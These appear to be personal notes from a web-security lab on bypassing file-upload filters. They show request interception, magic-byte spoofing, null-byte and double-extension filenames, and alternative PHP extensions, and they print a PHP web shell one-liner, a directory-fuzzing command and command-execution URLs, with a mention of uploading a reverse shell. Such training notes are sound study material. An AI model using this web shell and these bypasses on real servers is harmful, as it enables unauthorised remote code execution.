
check the types of file that can be uploaded

only .jpg and .png allowed

_**open network tab and see if any request going when you try to upload wrong type of file if no request in network tab then file type checking done on client side else if any requests in network tab when we try to upload wrong type of file means checking done on server side**_

_**If checking done on client side, send correct file type, intercept the request, modify the file type and data and forward it and see if it is accepted  
OR Disable JS so the check will never happen then send the file**_

here this method works as we upload png, intercept the request and change it to a php file

```php
<?php system($_GET['cmd']); ?>
```

dont forget ; 
system is a function that executes the commands $_GET gets the parameter passed inside GET request

To find where the file is uploaded to 

```sh
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost/labs/FUZZ
```

to the URL add the paramete ?cmd=commandToExecute

```txt
http://localhost/labs/uploads/anubis.php/cmd=id
```

***No need to change content-type header, just change the uploaded file extension to required extension***

Can also upload reverse shell in same manner


---


### Magic Bytes


check the types of file that can be uploaded

only .jpg and .png allowed

this time it is not accepting the file if we intercept the request and change file type

we can try changing file name to

***logo.php%00.png where %00 is nullbyte and it removes anything after it***

but it dosent work here

**sometime logo.php.png also works**

**Magic bytes are the first few bytes of the file that tell what kind of file it is.**

**so get back original payload with the PNG files data and insert inside it**

```php
<?php system($_GET['cmd']); ?>
```

keep only PNG magic byte and bit of starting and traling magic bytes also change the filename to .php and try to upload

it is uploaded

can get reverse shell by uploading pentestmonkey

if some kind of file types upload are blocked google php file extensions and there are other extensions for same file types

Other extensions : php3, php4, php5, phar, phtml 


Rather having a block list of files like bloking .php, .phar, we should have an allow list
that only allows certain file extensions

---


### Lab Challenge

Server probably has a block list since not allowing even after changing magic bytes

Try different php extensions

.phtml works

Upload and navigate to localhost/labs/uploads/a.phtml?cmd=whoami


And we get code execution
